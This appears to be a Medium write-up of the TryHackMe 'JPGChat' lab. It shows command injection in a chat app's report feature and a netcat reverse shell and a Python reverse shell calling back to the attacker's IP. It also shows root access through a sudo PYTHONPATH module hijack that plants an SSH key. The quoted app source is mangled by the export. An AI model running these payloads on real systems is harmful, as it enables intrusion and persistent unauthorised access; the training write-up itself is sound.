::: {}
# JPGChat Tryhackme Writeup {#jpgchat-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
This is a Writeup of Tryhackme room "JPGChat"
:::

::::::: {.section .e-content field="body"}
:::::: {#890b .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### JPGChat Tryhackme Writeup {#acd7 .graf .graf--h3 .graf--leading .graf--title name="acd7"}

**This is a Writeup of Tryhackme room "JPGChat"**

<figure id="1a78" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Y8pBXUpm6t7inQpp.png"
class="graf-image" data-image-id="0*Y8pBXUpm6t7inQpp.png"
data-width="473" data-height="257" data-is-featured="true" />
</figure>

**Room link:**
[https://tryhackme.com/room/jpgchat](https://tryhackme.com/room/jpgchat){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/jpgchat"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is Free**

Add to the Hosts file

``` {#cefc .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
echo 10.10.185.12     jpgchat >> /etc/hosts
```

### Enumeration {#02b3 .graf .graf--h3 .graf-after--pre name="02b3"}

<figure id="abc8" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*v9dVrJcjBaGUAzN9.png"
class="graf-image" data-image-id="0*v9dVrJcjBaGUAzN9.png"
data-width="607" data-height="434" />
</figure>

### 22/ssh {#2f59 .graf .graf--h3 .graf-after--figure name="2f59"}

No username of password so let's skip for now.

### 3000/JPChat {#1d0c .graf .graf--h3 .graf-after--p name="1d0c"}

<figure id="c7ad" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*-VyUPJpfi3nbH_mS.png"
class="graf-image" data-image-id="0*-VyUPJpfi3nbH_mS.png"
data-width="540" data-height="171" />
</figure>

Playing with the app we need to supply **\[MESSAGE\]** or **\[REPORT\]**
to get any output. From the **REPORT** feature, we get the name of the
admin!

<figure id="a357" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*aAD0BOorJqkbbNhu.png"
class="graf-image" data-image-id="0*aAD0BOorJqkbbNhu.png"
data-width="740" data-height="234" />
</figure>

### [https://github.com/search?q=jpchat&type=repositories&source=post_page\-\-\-\--3c14235865d0\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--](https://github.com/search?q=jpchat&type=repositories&source=post_page-----3c14235865d0--------------------------------){.markup--anchor .markup--h3-anchor data-href="https://github.com/search?q=jpchat&type=repositories&source=post_page-----3c14235865d0--------------------------------" rel="nofollow noopener" target="_blank"} {#cd83 .graf .graf--h3 .graf-after--figure name="cd83"}

<figure id="c5fe" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*sjZtL77FmkhdyeLT.png"
class="graf-image" data-image-id="0*sjZtL77FmkhdyeLT.png"
data-width="875" data-height="565" />
</figure>

[https://github.com/Mozzie-jpg/JPChat](https://github.com/Mozzie-jpg/JPChat){.markup--anchor
.markup--p-anchor data-href="https://github.com/Mozzie-jpg/JPChat"
rel="noopener ugc nofollow noopener" target="_blank"}

### Reviewing the source code for a weakness {#0e73 .graf .graf--h3 .graf-after--p name="0e73"}

Let's take a look at the source code and see if we can find an attack
vector.

[https://raw.githubusercontent.com/Mozzie-jpg/JPChat/main/jpchat.py](https://raw.githubusercontent.com/Mozzie-jpg/JPChat/main/jpchat.py){.markup--anchor
.markup--p-anchor
data-href="https://raw.githubusercontent.com/Mozzie-jpg/JPChat/main/jpchat.py"
rel="noopener ugc nofollow noopener" target="_blank"}

``` {#96c7 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
#!/usr/bin/env python3import osprint ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')def report_form():    print ('this report will be read by Mozzie-jpg')
    your_name = input('your name:\n')
   report_text = input('your report:\n')
   os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
  os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)def chatting_service():   print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
  print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
   message = input('')   if message == '[REPORT]':
        report_form()
 if message == '[MESSAGE]':
       print ('There are currently 0 other users logged in')
       while True:
           message2 = input('[MESSAGE]: ')
         if message2 == '[REPORT]':
               report_form()chatting_service()
```

Looking at the above we can see the `os.system`{.markup--code
.markup--p-code} is used to echo the input from `[REPORT]`{.markup--code
.markup--p-code} to a text file. We can see that it is using
`%s`{.markup--code .markup--p-code} and there is NO sanitisation of user
input, we can exploit this by using `';`{.markup--code .markup--p-code}
to close the `echo`{.markup--code .markup--p-code} command and then run
our command followed by `#`{.markup--code .markup--p-code}

### Get revershell {#2880 .graf .graf--h3 .graf-after--p name="2880"}

``` {#9cd1 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.12.26 4444 >/tmp/f
```

<figure id="6a30" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*p5WuRhNN3LoGRA9E.png"
class="graf-image" data-image-id="0*p5WuRhNN3LoGRA9E.png"
data-width="875" data-height="315" />
</figure>

Listening using `nc -lvnp 4444`{.markup--code .markup--p-code} we get a
shell back.

<figure id="bfad" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ZMVamvEB6gSkBGG1.png"
class="graf-image" data-image-id="0*ZMVamvEB6gSkBGG1.png"
data-width="598" data-height="166" />
</figure>

From here I add my **id_rsa.pub** to **/home/wes/.ssh/authorized_keys**
so that I can get a stable shell & persistence.

After this we can read **user.txt**

<figure id="9d35" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*i1_jc6CmBYJLVWQ8.png"
class="graf-image" data-image-id="0*i1_jc6CmBYJLVWQ8.png"
data-width="695" data-height="281" />
</figure>

<figure id="e21e" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*rzxhICx8-ZPZK7tq.png"
class="graf-image" data-image-id="0*rzxhICx8-ZPZK7tq.png"
data-width="875" data-height="199" />
</figure>

copy the key and paste into box

<figure id="4590" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*JMlHPir4MggrvMtb.png"
class="graf-image" data-image-id="0*JMlHPir4MggrvMtb.png"
data-width="875" data-height="263" />
</figure>

Now we can login through our terminal

<figure id="e548" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*GVv7d_qFhRYIsuY9.png"
class="graf-image" data-image-id="0*GVv7d_qFhRYIsuY9.png"
data-width="690" data-height="400" />
</figure>

<figure id="db0d" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*U8YpJ_AKUOR0BlOz.png"
class="graf-image" data-image-id="0*U8YpJ_AKUOR0BlOz.png"
data-width="414" data-height="164" />
</figure>

### Escalate your privileges to root and read root.txt {#c06c .graf .graf--h3 .graf-after--figure name="c06c"}

Ok, so first thing is first lets see if we can run anything with
`sudo`{.markup--code .markup--p-code}\...

<figure id="e746" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*eoX71J-ykI650ILu.png"
class="graf-image" data-image-id="0*eoX71J-ykI650ILu.png"
data-width="803" data-height="408" />
</figure>

Interesting we can run a `test_module.py`{.markup--code .markup--p-code}
and looking at the `sudo`{.markup--code .markup--p-code} command it will
keep the environment variable `PYTHONPATH`{.markup--code
.markup--p-code}. First thought of maybe editing the script is a *no go*
as it is owned by `root`{.markup--code .markup--p-code} and we only have
read access.

<figure id="2a08" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*M5mwbbkkPisVukEq.png"
class="graf-image" data-image-id="0*M5mwbbkkPisVukEq.png"
data-width="730" data-height="212" />
</figure>

Interesting, it is importing the `compare`{.markup--code
.markup--p-code} module and then running a print command.

### compare.py {#99ee .graf .graf--h3 .graf-after--p name="99ee"}

Ok, lets create a new python "module" called `comapre.py`{.markup--code
.markup--p-code} with the following contents using our trusty old
`pty`{.markup--code .markup--p-code} module to spawn a shell.

Make a file in **/tmp** called **compare.py** with the following python3
reverse shell. Swap your IP Address in the code. (replace
\<\<IPADDRESS\>\> with your own)

``` {#8e0d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="lua"}
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.2.12.26",7777))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("/bin/bash")
```

<figure id="7638" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*VTFWkD7baVBnl6uj.png"
class="graf-image" data-image-id="0*VTFWkD7baVBnl6uj.png"
data-width="531" data-height="185" />
</figure>

Now export the PYTHONPATH

<figure id="dd95" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*GeJkDsnWg_wPRbq6.png"
class="graf-image" data-image-id="0*GeJkDsnWg_wPRbq6.png"
data-width="494" data-height="131" />
</figure>

Start a Netcat listener on your pc, then run the command from **sudo
-l**

<figure id="a497" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*uIyHYrAfXuZgdhFF.png"
class="graf-image" data-image-id="0*uIyHYrAfXuZgdhFF.png"
data-width="334" data-height="119" />
</figure>

<figure id="690a" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*sxPl_vGewFsIP2rS.png"
class="graf-image" data-image-id="0*sxPl_vGewFsIP2rS.png"
data-width="875" data-height="62" />
</figure>

<figure id="20d5" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*tsP6sZGNyXd7zK0D.png"
class="graf-image" data-image-id="0*tsP6sZGNyXd7zK0D.png"
data-width="598" data-height="133" />
</figure>

Boom! We got Root Shell

<figure id="6f2b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*zJCaYDWYZQLcLDmG.png"
class="graf-image" data-image-id="0*zJCaYDWYZQLcLDmG.png"
data-width="773" data-height="284" />
</figure>

### Another Method to privileges {#bf6e .graf .graf--h3 .graf-after--figure name="bf6e"}

<figure id="7d48" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*O86dfPd1PeQspMOV.png"
class="graf-image" data-image-id="0*O86dfPd1PeQspMOV.png"
data-width="730" data-height="212" />
</figure>

Interesting, it is importing the `compare`{.markup--code
.markup--p-code} module and then running a print command.

Some context here: We have `env_keep+=PYTHONPATH`{.markup--code
.markup--p-code} which allows us to add other paths where python can
find the libraries.

and the scripts imports `compare`{.markup--code .markup--p-code} as
libary. We can create a new script in our home folder called
`compare.py`{.markup--code .markup--p-code}

And then try to mimic the function `compare.Str`{.markup--code
.markup--p-code}. In our new libary, we call `os.system`{.markup--code
.markup--p-code} and we try to write our ssh-key to
`/root/.ssh/authorized_keys`{.markup--code .markup--p-code}.

> ***NOTE: I'm using the same public key as*** ***`wes`{.markup--code
> .markup--blockquote-code}**, you could create another key if you want
> to, but I preferred to not to.***

``` {#5fef .graf .graf--pre .graf-after--blockquote .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="kotlin"}
import os
class compare:
  def Str(s1, s2, s3):
    os.system("mkdir /root/.ssh; echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC37zwXQu5CDYhb9Hz8LcOsKnTnfQdilPYTneI1ZYrzCTEQPddYjOiTb8LZcneUbyR3LOecIA7vo3bXjk8odQ9BmsWeZbpKdio75teGawnKOEvhyxizq7o1nfiwx8EV5kB84QsdQC4FD67heYCZOPGoZq7tdgNpCIXS2LWI4qCs+KMETQleiAuCK3omHYDd0AS4N+D/d1y4/z10FE2+dux7fAbYuU4vNaMK+NfVT4+4N+4dSVFuyYJir7x10feLnjjhAEmqYlWxfASxd3EjfuTGHgI3arMg2J0W623E4Wl51pylOksVqrEWnarDJ3C7Klmc5MKnWgMLdKYQRqyj8XR854WPNpsWl+3p0aHH5PjhR4tNcMkddHyOcqFT6l7UtMOCO5FbMxcgnpxQyzXpp0Bu+NosC3T3UF0zSVdt+/LyqnFBMYj9cl7HWfRK2DrSZFJOrX3l79/beyl+c8z8GTo2PMmTqS/NH3m5PAkgpe7c8/WRROrVP80fcv5O60N+71U= sam@kali >> /root/.ssh/authorized_keys")
```

<figure id="80b8" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*8M0Ln-7FxjXJyOLP.png"
class="graf-image" data-image-id="0*8M0Ln-7FxjXJyOLP.png"
data-width="875" data-height="340" />
</figure>

Now, we have to change hte `PYTHONPATH`{.markup--code .markup--p-code}
env. In this way, python will look up for the library in our directory.

``` {#3e36 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
export PYTHONPATH=$(pwd):$PYTHONPATH
```

Now we execute the python script with sudo:

``` {#d043 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
sudo /usr/bin/python3 /opt/development/test_module.py
```

<figure id="5ca5" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Ukl3QptydeFdvEBs.png"
class="graf-image" data-image-id="0*Ukl3QptydeFdvEBs.png"
data-width="767" data-height="141" />
</figure>

We can see some strange output:

``` {#4d85 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
mkdir: cannot create directory ‘/root/.ssh’: File exists
None
```

But it doesn't matter that `mkdir`{.markup--code .markup--p-code}
failed, because it actually wrote the ssh key in the
`/root/.ssh/authoridez_keys`{.markup--code .markup--p-code} because
otherwise we would've get another error.

Now, on our machine, we can once again use ssh but this time we're gonna
use the username `root`{.markup--code .markup--p-code}. Same as we did
before.

<figure id="279d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*_8-noD_Ahj4P8V5V.png"
class="graf-image" data-image-id="0*_8-noD_Ahj4P8V5V.png"
data-width="715" data-height="475" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#06a1 .graf .graf--h3 .graf-after--figure name="06a1"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#db23 .graf .graf--h3 .graf-after--p name="db23"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 20, 2024](https://medium.com/p/a862891a87e6).

[Canonical
link](https://medium.com/@bevijaygupta/jpgchat-tryhackme-writeup-a862891a87e6){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
